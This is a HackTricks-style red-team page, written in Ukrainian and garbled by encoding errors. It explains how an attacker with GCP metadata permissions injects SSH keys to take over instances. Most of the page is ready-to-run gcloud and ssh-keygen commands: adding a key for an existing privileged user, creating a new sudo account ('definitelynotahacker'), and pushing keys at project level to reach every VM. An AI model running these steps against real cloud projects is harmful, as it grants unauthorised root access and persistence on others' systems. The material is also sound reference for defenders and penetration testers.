# GCP - –î–æ–¥–∞–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏—Ö –º–µ—Ç–∞–¥–∞–Ω–∏—Ö SSH

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**–®–∫–æ–ª–∞ –≤–∑–ª–æ–º—É HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**–®–∫–æ–ª–∞ –≤–∑–ª–æ–º—É HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –ó–º—ñ–Ω–∞ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

–ó–º—ñ–Ω–∞ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ **–∑–Ω–∞—á–Ω–∏—Ö —Ä–∏–∑–∏–∫—ñ–≤ –±–µ–∑–ø–µ–∫–∏, —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –æ—Ç—Ä–∏–º–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏**.

### **–í–∫–ª—é—á–µ–Ω–Ω—è SSH-–∫–ª—é—á—ñ–≤ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –º–µ—Ç–∞–¥–∞–Ω—ñ**

–ù–∞ GCP, **—Å–∏—Å—Ç–µ–º–∏ Linux** —á–∞—Å—Ç–æ –≤–∏–∫–æ–Ω—É—é—Ç—å —Å–∫—Ä–∏–ø—Ç–∏ –∑ [Python Linux Guest Environment –¥–ª—è Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). –ö—Ä–∏—Ç–∏—á–Ω–∏–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º —î [–¥–µ–º–æ–Ω –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), —è–∫–∏–π –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è **—Ä–µ–≥—É–ª—è—Ä–Ω–æ—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏** –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –Ω–∞ **–æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –ø—É–±–ª—ñ—á–Ω–∏—Ö SSH-–∫–ª—é—á—ñ–≤**.

–û—Ç–∂–µ, —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –º–µ—Ç–∞–¥–∞–Ω—ñ, –≤—ñ–Ω –º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ –¥–µ–º–æ–Ω–∞ –∑–Ω–∞–π—Ç–∏ –Ω–æ–≤–∏–π –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á, —è–∫–∏–π –±—É–¥–µ –æ–±—Ä–æ–±–ª–µ–Ω–∏–π —Ç–∞ **—ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∏–π —É –ª–æ–∫–∞–ª—å–Ω—É —Å–∏—Å—Ç–µ–º—É**. –ö–ª—é—á –±—É–¥–µ –¥–æ–¥–∞–Ω–∏–π –¥–æ —Ñ–∞–π–ª—É `~/.ssh/authorized_keys` —ñ—Å–Ω—É—é—á–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ, –º–æ–∂–ª–∏–≤–æ, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ `sudo`, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ñ–æ—Ä–º–∞—Ç—É –∫–ª—é—á–∞. –Ü –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Ö–æ—Å—Ç.

### **–î–æ–¥–∞–≤–∞–Ω–Ω—è SSH-–∫–ª—é—á–∞ –¥–æ —ñ—Å–Ω—É—é—á–æ–≥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**

1. **–ü–µ—Ä–µ–≥–ª—è–¥ —ñ—Å–Ω—É—é—á–∏—Ö SSH-–∫–ª—é—á—ñ–≤ –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ:**
- –í–∏–∫–æ–Ω–∞–π—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –æ–ø–∏—Å—É –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ —Ç–∞ –π–æ–≥–æ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö, —â–æ–± –∑–Ω–∞–π—Ç–∏ —ñ—Å–Ω—É—é—á—ñ SSH-–∫–ª—é—á—ñ. –í—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π —Ä–æ–∑–¥—ñ–ª —É –≤–∏–≤–æ–¥—ñ –±—É–¥–µ –ø—ñ–¥ `metadata`, –∑–æ–∫—Ä–µ–º–∞ –∫–ª—é—á `ssh-keys`.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ —Ñ–æ—Ä–º–∞—Ç SSH-–∫–ª—é—á—ñ–≤: –ø–µ—Ä–µ–¥ –∫–ª—é—á–µ–º –π–¥–µ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ä–æ–∑–¥—ñ–ª–µ–Ω–µ –¥–≤–æ–∫—Ä–∞–ø–∫–æ—é.

2. **–ü—ñ–¥–≥–æ—Ç–æ–≤–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É –¥–ª—è –º–µ—Ç–∞–¥–∞–Ω–∏—Ö SSH-–∫–ª—é—á–∞:**
- –ó–±–µ—Ä–µ–∂—ñ—Ç—å –¥–µ—Ç–∞–ª—ñ —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏—Ö SSH-–∫–ª—é—á—ñ–≤ —É —Ç–µ–∫—Å—Ç–æ–≤–∏–π —Ñ–∞–π–ª –∑ –Ω–∞–∑–≤–æ—é `meta.txt`. –¶–µ –≤–∞–∂–ª–∏–≤–æ –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —ñ—Å–Ω—É—é—á–∏—Ö –∫–ª—é—á—ñ–≤ –ø—Ä–∏ –¥–æ–¥–∞–≤–∞–Ω–Ω—ñ –Ω–æ–≤–∏—Ö.

3. **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ SSH-–∫–ª—é—á–∞ –¥–ª—è —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (`alice` —É —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ):**
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É `ssh-keygen` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –Ω–æ–≤–æ–≥–æ SSH-–∫–ª—é—á–∞, –ø–µ—Ä–µ–∫–æ–Ω–∞–≤—à–∏—Å—å, —â–æ –ø–æ–ª–µ –∫–æ–º–µ–Ω—Ç–∞—Ä—è (`-C`) –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —ñ–º–µ–Ω—ñ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- –î–æ–¥–∞–π—Ç–µ –Ω–æ–≤–∏–π –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á –¥–æ `meta.txt`, –Ω–∞—Å–ª—ñ–¥—É—é—á–∏ —Ñ–æ—Ä–º–∞—Ç, –∑–Ω–∞–π–¥–µ–Ω–∏–π —É –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä–∞.

4. **–û–Ω–æ–≤–ª–µ–Ω–Ω—è –º–µ—Ç–∞–¥–∞–Ω–∏—Ö SSH-–∫–ª—é—á–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞:**
- –ó–∞—Å—Ç–æ—Å—É–π—Ç–µ –æ–Ω–æ–≤–ª–µ–Ω—ñ –º–µ—Ç–∞–¥–∞–Ω—ñ SSH-–∫–ª—é—á–∞ –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ `gcloud compute instances add-metadata`.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **–î–æ—Å—Ç—É–ø –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–æ–≤–æ–≥–æ SSH-–∫–ª—é—á–∞:**
- –ü—ñ–¥–∫–ª—é—á—ñ—Ç—å—Å—è –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é SSH –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–æ–≤–æ–≥–æ –∫–ª—é—á–∞, –æ—Ç—Ä–∏–º—É—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–æ–ª–æ–Ω–∫–∏ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (`alice` —É —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ).
```bash
ssh -i ./key alice@localhost
sudo id
``` 

### **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –¥–æ–¥–∞–≤–∞–Ω–Ω—è SSH-–∫–ª—é—á–∞**

–Ø–∫—â–æ –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ —Ü—ñ–∫–∞–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –º–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–æ–≥–æ, —è–∫–æ–º—É –±—É–¥—É—Ç—å –Ω–∞–¥–∞–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### SSH –∫–ª—é—á—ñ –Ω–∞ —Ä—ñ–≤–Ω—ñ –ø—Ä–æ–µ–∫—Ç—É <a href="#sshing-around" id="sshing-around"></a>

–ú–æ–∂–ª–∏–≤–æ —Ä–æ–∑—à–∏—Ä–∏—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ SSH –¥–æ –∫—ñ–ª—å–∫–æ—Ö –í—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö –ú–∞—à–∏–Ω (VMs) –≤ —Ö–º–∞—Ä–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, **–∑–∞—Å—Ç–æ—Å–æ–≤—É—é—á–∏ SSH –∫–ª—é—á—ñ –Ω–∞ —Ä—ñ–≤–Ω—ñ –ø—Ä–æ–µ–∫—Ç—É**. –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –¥–æ–∑–≤–æ–ª—è—î –¥–æ—Å—Ç—É–ø –¥–æ SSH –¥–æ –±—É–¥—å-—è–∫–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—Ä–æ–µ–∫—Ç—É, —è–∫–∏–π –Ω–µ –±—É–≤ —è–≤–Ω–æ –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–∏–π –¥–ª—è –ø—Ä–æ–µ–∫—Ç–Ω–∏—Ö –∫–ª—é—á—ñ–≤ SSH. –û—Å—å —É–∑–∞–≥–∞–ª—å–Ω–µ–Ω–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫:

1. **–ó–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è SSH –∫–ª—é—á—ñ–≤ –Ω–∞ —Ä—ñ–≤–Ω—ñ –ø—Ä–æ–µ–∫—Ç—É:**
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É `gcloud compute project-info add-metadata`, —â–æ–± –¥–æ–¥–∞—Ç–∏ SSH –∫–ª—é—á—ñ –∑ `meta.txt` –¥–æ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –ø—Ä–æ–µ–∫—Ç—É. –¶—è –¥—ñ—è –≥–∞—Ä–∞–Ω—Ç—É—î, —â–æ SSH –∫–ª—é—á—ñ –±—É–¥—É—Ç—å –≤–∏–∑–Ω–∞–Ω—ñ –Ω–∞ –≤—Å—ñ—Ö VMs —É –ø—Ä–æ–µ–∫—Ç—ñ, —è–∫—â–æ VM –Ω–µ –º–∞—î –≤–∫–ª—é—á–µ–Ω–æ—ó –æ–ø—Ü—ñ—ó "–ë–ª–æ–∫—É–≤–∞—Ç–∏ –ø—Ä–æ–µ–∫—Ç–Ω—ñ –∫–ª—é—á—ñ SSH".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–æ–µ–∫—Ç–Ω—ñ –∫–ª—é—á—ñ:**
- –ó –ø—Ä–æ–µ–∫—Ç–Ω–∏–º–∏ –∫–ª—é—á–∞–º–∏ SSH –Ω–∞ –º—ñ—Å—Ü—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ SSH –≤ –±—É–¥—å-—è–∫–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—Ä–æ–µ–∫—Ç—É. –ï–∫–∑–µ–º–ø–ª—è—Ä–∏, —è–∫—ñ –Ω–µ –±–ª–æ–∫—É—é—Ç—å –ø—Ä–æ–µ–∫—Ç–Ω—ñ –∫–ª—é—á—ñ, –ø—Ä–∏–π–º—É—Ç—å SSH –∫–ª—é—á, –Ω–∞–¥–∞—é—á–∏ –¥–æ—Å—Ç—É–ø.
- –ü—Ä—è–º–∏–π –º–µ—Ç–æ–¥ SSH –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä –ø–æ–ª—è–≥–∞—î –≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ `gcloud compute ssh [INSTANCE]`. –¶—è –∫–æ–º–∞–Ω–¥–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤–∞—à–µ –ø–æ—Ç–æ—á–Ω–µ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ SSH –∫–ª—é—á—ñ, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –Ω–∞ —Ä—ñ–≤–Ω—ñ –ø—Ä–æ–µ–∫—Ç—É, –¥–ª—è —Å–ø—Ä–æ–±–∏ –¥–æ—Å—Ç—É–ø—É.


# References
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
